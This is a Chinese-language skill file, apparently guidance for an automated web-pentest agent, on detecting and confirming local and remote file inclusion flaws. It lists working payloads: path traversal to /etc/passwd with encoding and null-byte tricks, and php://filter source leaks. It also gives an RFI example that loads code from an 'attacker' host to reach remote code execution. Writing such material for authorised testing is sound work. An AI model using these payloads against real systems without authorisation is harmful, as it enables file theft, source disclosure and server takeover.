---
name: fi
category: web
description: 任意文件包含（LFI/RFI）——响应必须含目标文件特征字符串才算成功。区分 Local FI（读本地文件）vs Remote FI（加载远程文件）。
---

# 任意文件包含（FI）

## 漏洞本质

应用把用户可控的参数**直接拼接进文件加载逻辑**（`include` / `require` / `fopen` / `file_get_contents` 等），导致：

- **LFI**（Local FI）：读服务器本地任意文件
- **RFI**（Remote FI）：加载远程 URL 内容（多数 PHP 默认禁用 `allow_url_include`）

LFI 进阶利用：读 PHP 源码（wrapper）/ session poisoning / log poisoning → RCE。

## 挖掘方向（思路，不是步骤）

**唯一铁律**：验证 LFI 成功 = 响应 body **含目标文件的特征指纹**（如 `/etc/passwd` 的 `root:x:0:0:` 或 `:/root:`，`/proc/self/environ` 的 `PATH=` 等）。**仅状态码 200 不够**——可能返回 200 但是空白页 / 错误页 / 应用自定义"文件不存在"提示。

下面是倾向性建议，不是规则：

- 看流量参数名（如 `?page=` / `?file=` / `?include=` / `?template=`）→ 这些是高概率 FI 漏洞点
- 看流量原本传的值（如 `file1.php`）→ 推断后端是否做了后缀拼接
- LFI 比 RFI 更普遍（默认 PHP 配置禁用 `allow_url_include`）

## 判定原则（按优先级）

### 1. 响应 body 含目标文件**特征指纹** → LFI 确认（high）

特征指纹（按可信度从高到低）：

- `/etc/passwd`：`root:x:0:0:` 或 `:/root:/bin/bash`
- `/etc/hosts`：`127.0.0.1.*localhost`
- `/proc/self/environ`：`PATH=` / `HOME=`
- `/proc/self/cmdline`：当前进程命令行
- Windows `C:\Windows\win.ini`：`[fonts]` 或 `[extensions]`

### 2. PHP wrapper 能读 PHP 源码 → high

`php://filter/convert.base64-encode/resource=index` 返回 base64 字符串——base64 解码后是 PHP 源码 → **源码泄漏**。

进阶 wrapper：`data://`、`expect://`（极少启用）、`phar://`（反序列化链入口）

### 3. RFI 启用：`?page=http://attacker/x.txt` 加载远程内容 → critical

`allow_url_include=On` 时启用，多数 PHP 默认 `Off`。若启用 → 直接 RCE（远程 PHP shell 加载）。

### 4. 响应 200 但 body 为空 / 错误页面 → 未触发

- WAF 拦截
- 路径拼接错误（被加了后缀如 `.php` 导致 `/etc/passwd.php` 不存在）→ 尝试 `%00` 截断或 query 截断 `?`
- 应用做了路径白名单 → 看是否能用 wrapper 绕过

### 5. 响应 500 + 错误信息含目标路径回显 → 疑似 LFI

如 `failed to open stream: No such file or directory in /var/www/html/...`——路径被拼接处理，只是目标文件不存在。换个 payload（深一层路径、不同目标文件、wrapper）。

## payload 策略（倾向性建议）

| 类型 | 示例 |
|---|---|
| 路径遍历 | `../../../etc/passwd` / `../../../../etc/passwd`（深度多试几个） |
| URL 编码 | `%2e%2e%2f` / `..%2f` |
| URL 双编码 | `%252e%252e%252f` |
| Null byte 截断 | `../../../etc/passwd%00`（PHP < 5.3） |
| Query 截断 | `../../../etc/passwd?`（绕过后缀拼接） |
| PHP wrapper | `php://filter/convert.base64-encode/resource=index` |
| 绝对路径 | `/etc/passwd`（如无路径校验） |
| Windows | `..\\..\\..\\windows\\win.ini` |

## 误报排除

- 响应 200 但 body 是应用自定义"文件未找到"友好提示 → 没触发
- 响应里 echo 了 payload 字符串本身 → 是 reflected，不是 LFI
- 响应包含目标文件名但无文件内容 → 路径处理但读取失败

## write_finding 红线

evidence 必须包含：

- **完整 payload**（含编码层数 / 路径深度 / 截断符 / wrapper 形态）
- **响应 body 片段**：必须含目标文件特征指纹（如 `root:x:0:0:`）
- **payload 与响应映射**：明确"`?page=../../../etc/passwd` → 响应含 `root:x:0:0:`"
- **repro_cmd**：完整 curl 命令

summary ≤500 字单行：`LFI in GET /vulnerabilities/fi/?page= — read /etc/passwd via ../../../ path traversal`
